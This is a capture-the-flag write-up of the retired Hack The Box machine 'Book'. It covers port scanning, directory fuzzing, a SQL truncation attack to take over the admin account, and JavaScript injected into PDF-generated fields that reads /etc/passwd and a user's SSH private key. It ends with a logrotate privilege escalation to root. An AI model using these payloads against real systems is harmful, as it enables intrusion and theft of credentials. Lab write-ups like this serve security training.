---
layout: post
title: "Book: Hack The Box Walkthrough"
date: 2020-07-11 15:02:18 +0000
last_modified_at: 2020-07-11 15:02:18 +0000
category: Walkthrough
tags: ["Hack The Box", Book, retired, Linux, Medium]
comments: false
image:
  feature: book-htb-walkthrough.png
---

This post documents the complete walkthrough of Book, a retired vulnerable [VM][1] created by [MrR3boot][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Book is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.176 --rate=500

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-02-23 02:12:57 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 80/tcp on 10.10.10.176
Discovered open port 22/tcp on 10.10.10.176
```

Nothing extraordinary. Let's do one better with `nmap` scanning the discovered ports to establish their services.

```
# nmap -n -v -Pn -p22,80 -A --reason 10.10.10.176 -oN nmap.txt
...
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 f7:fc:57:99:f6:82:e0:03:d6:03:bc:09:43:01:55:b7 (RSA)
|   256 a3:e5:d1:74:c4:8a:e8:c8:52:c7:17:83:4a:54:31:bd (ECDSA)
|_  256 e3:62:68:72:e2:c0:ae:46:67:3d:cb:46:bf:69:b9:6a (ED25519)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: LIBRARY - Read | Learn | Have Fun
```

This is a shit show man. This is how the site looks like.

{% include image.html image_alt="b434f981.png" image_src="/51943661-30c4-4833-a400-abdf98c127f7/b434f981.png" %}

### Directory/File Enumeration

Before we begin fuzzing, note that we can sign up a new account and log in to the site.

{% include image.html image_alt="9b2b8927.png" image_src="/51943661-30c4-4833-a400-abdf98c127f7/9b2b8927.png" %}

Also, notice that there's a `validateForm()` JavaScript.

{% include image.html image_alt="c019aadc.png" image_src="/51943661-30c4-4833-a400-abdf98c127f7/c019aadc.png" %}

Basically it does nothing other than telling us the length requirement of 10 and 20 characters respectively for the `name` and `email` fields. :wink:

{% include image.html image_alt="d9338706.png" image_src="/51943661-30c4-4833-a400-abdf98c127f7/d9338706.png" %}

This is what the site looks like after logging in.

{% include image.html image_alt="5b21280a.png" image_src="/51943661-30c4-4833-a400-abdf98c127f7/5b21280a.png" %}

The purpose of that is to get a valid session cookie for fuzzing.

```
gobuster dir -w dirbuster.txt -c "PHPSESSID=2abemapmnqa92r1nq42261m2fq" -t 20 -e -x php,pdf,txt -u http://10.10.10.176/                                                                                                                                                                           
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.176/
[+] Threads:        20
[+] Wordlist:       dirbuster.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] Cookies:        PHPSESSID=2abemapmnqa92r1nq42261m2fq
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     pdf,txt,php
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/02/23 04:32:17 Starting gobuster
===============================================================
http://10.10.10.176/images (Status: 301)
http://10.10.10.176/search.php (Status: 200)
http://10.10.10.176/download.php (Status: 200)
http://10.10.10.176/contact.php (Status: 200)
http://10.10.10.176/home.php (Status: 200)
http://10.10.10.176/index.php (Status: 302)
http://10.10.10.176/profile.php (Status: 200)
http://10.10.10.176/docs (Status: 301)
http://10.10.10.176/books.php (Status: 200)
http://10.10.10.176/feedback.php (Status: 200)
http://10.10.10.176/admin (Status: 301)
http://10.10.10.176/db.php (Status: 200)
http://10.10.10.176/logout.php (Status: 302)
http://10.10.10.176/collections.php (Status: 302)
http://10.10.10.176/settings.php (Status: 302)
Progress: 34144 / 81630 (41.83%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2020/02/23 04:48:57 Finished
===============================================================
```

On top of that, casual browsing of the site reveals the email address of `admin`.

{% include image.html image_alt="ee6d0a07.png" image_src="/51943661-30c4-4833-a400-abdf98c127f7/ee6d0a07.png" %}

### Bypass `admin`'s Authentication with SQL Truncation Attack

Notice from above that there's an `/admin` present? This is how it looks like.

{% include image.html image_alt="879de8af.png" image_src="/51943661-30c4-4833-a400-abdf98c127f7/879de8af.png" %}

If I had to guess, I would say that the backend uses prepared statement from MySQLi extension for authentication. Why? Because I can tease out existing username check with the `admin`'s email address alone.

{% include image.html image_alt="7b8f1a92.png" image_src="/51943661-30c4-4833-a400-abdf98c127f7/7b8f1a92.png" %}

Which means that somewhere in `index.php` there's code that does something like this:

```
$stmt=$conn->prepare("select email from users where email=?");
$stmt->bind_param('s',$_POST["email"]);
$stmt->execute();
$result = $stmt->get_result();
$num_rows=$result->num_rows;
if($num_rows > 0)
{
	echo '<script>alert("User Exits!");window.location="/index.php";</script>';
}
else
{
	$stmt=$conn->prepare("insert into users values(?,?,?)");
	$stmt->bind_param('sss',$_POST['name'],$_POST['email'],$_POST['password']);
	$stmt->execute();
	header('location: index.php');
}
```

Armed with this hypothesis, let's see if we can bypass `admin`'s authentication with a SQL truncation attack like this.

{% include image.html image_alt="acfcdf26.png" image_src="/51943661-30c4-4833-a400-abdf98c127f7/acfcdf26.png" %}

We noted that `name` has a 10 characters limit while `email` has a 20 characters limit. In Burp's Repeater above, we input the `name` field with `admin_____1` (11 characters, and where `_` represents the space character) and the email field with `admin@book.htb_______1` (21 characters, and where `_` represents the space character).

This will allow us to bypass the existing username check based on email because there's no username `admin@book.htb______1`. Right after this, the `INSERT` query strips the `1` because of the 20 character limit and truncates the rest of the whitespaces and insert `admin@book.htb` into the database with my chosen password (`letmein`). After some testing, the character limit of the `name` field was found to be 11 instead of 10. Sneaky!

Now let's see if we can log in to `/admin`.

{% include image.html image_alt="7472319b.png" image_src="/51943661-30c4-4833-a400-abdf98c127f7/7472319b.png" %}

I notice that I can't log in if I try it again at `/admin/index.php`. I have to re-insert the entry and then it works. Looks like some kind of database job is scheduled to aggressively remove the inserted entry from the database.

### SSRF attack

Here's where I found something interesting at the Collections page.

{% include image.html image_alt="47929bdc.png" image_src="/51943661-30c4-4833-a400-abdf98c127f7/47929bdc.png" %}

Opening the Collections PDF reveals something that looks like a generated PDF from a HTML.

{% include image.html image_alt="62aabed1.png" image_src="/51943661-30c4-4833-a400-abdf98c127f7/62aabed1.png" %}

With that in mind, let's upload something with a litte something extra peppered in the Title and the Author columns like so.

```
<script>
xhr = new XMLHttpRequest();
xhr.onload = function() {
  document.write(this.responseText)
};
xhr.open("GET", "file:///etc/passwd");
xhr.send();
</script>
```

{% include image.html image_alt="897f87cc.png" image_src="/51943661-30c4-4833-a400-abdf98c127f7/897f87cc.png" %}

The PDF doesn't even have to be a real PDF :smiling_imp: Now, let's see what do we get.

{% include image.html image_alt="00eb7ad2.png" image_src="/51943661-30c4-4833-a400-abdf98c127f7/00eb7ad2.png" %}

## Low-Privilege Shell

Maybe we can grab hold of `reader`'s RSA private key with this little nugget?

```
<script>
xhr = new XMLHttpRequest();
xhr.onload = function() {
  document.write(this.responseText)
};
xhr.open("GET", "file:///home/reader/.ssh/id_rsa");
xhr.send();
</script>
```

{% include image.html image_alt="286061b3.png" image_src="/51943661-30c4-4833-a400-abdf98c127f7/286061b3.png" %}

Awesome. After some massaging of the text, we should be able to log in as `reader`.

{% include image.html image_alt="3d5f3247.png" image_src="/51943661-30c4-4833-a400-abdf98c127f7/3d5f3247.png" %}

The file `user.txt` is at `reader`'s home directory.

{% include image.html image_alt="b561ba6c.png" image_src="/51943661-30c4-4833-a400-abdf98c127f7/b561ba6c.png" %}

## Privilege Escalation

During enumeration of `reader`'s account, I notice that `logrotate` executes every 5 seconds.

{% include image.html image_alt="96d4f800.png" image_src="/51943661-30c4-4833-a400-abdf98c127f7/96d4f800.png" %}

I also notice the presence of a `backups` directory containing two log files.

{% include image.html image_alt="1969c716.png" image_src="/51943661-30c4-4833-a400-abdf98c127f7/1969c716.png" %}

Putting two and two together, I figure we might have a `logrotten` [exploit](https://tech.feedyourhead.at/content/abusing-a-race-condition-in-logrotate-to-elevate-privileges) at hand.

### logrotate <= 3.15.1 - Privilege Escalation

If I had to guess, I would say that that `/root/log.cfg` may well look something like this.

```
/home/reader/backups/access.log {
        daily
        rotate 12
        missingok
        notifempty
        size 1k
        create
}
```

Let's go ahead and put in a RSA public key I control into `/root/.ssh/authorized_keys` as the payload.

{% include image.html image_alt="e0db5146.png" image_src="/51943661-30c4-4833-a400-abdf98c127f7/e0db5146.png" %}

Bombs away.

{% include image.html image_alt="6fb63771.png" image_src="/51943661-30c4-4833-a400-abdf98c127f7/6fb63771.png" %}

We should get our `root` shell right after we re-login to `reader`'s account.

{% include image.html image_alt="3d41d57a.png" image_src="/51943661-30c4-4833-a400-abdf98c127f7/3d41d57a.png" %}

Bam. Getting `root.txt` should be a piece of cake now.

{% include image.html image_alt="c0387947.png" image_src="/51943661-30c4-4833-a400-abdf98c127f7/c0387947.png" %}

:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/230
[2]: https://www.hackthebox.eu/home/users/profile/13531
[3]: https://www.hackthebox.eu/
